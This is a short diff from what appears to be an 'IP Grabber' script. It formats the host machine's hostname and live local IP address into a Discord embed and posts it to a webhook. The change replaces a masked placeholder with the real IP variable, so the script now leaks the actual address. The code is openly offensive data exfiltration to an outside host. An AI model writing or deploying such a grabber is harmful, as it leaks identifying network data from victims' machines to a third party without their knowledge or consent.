@@ -26,7 +26,7 @@ requests.post(url=DiscordWebhook, json={ # Posts this JSON request to the webhoo
     "embeds" : [
         {
             "title":"Manana's IP Grabber",
-            "description":f"{hostname}'s IP Address\n\n:link: `1XX.XXX.XX.X`",
+            "description":f"{hostname}'s IP Address\n\n:link: `{current_local_ip}`",
             "color":0xffffff
         }
     ]
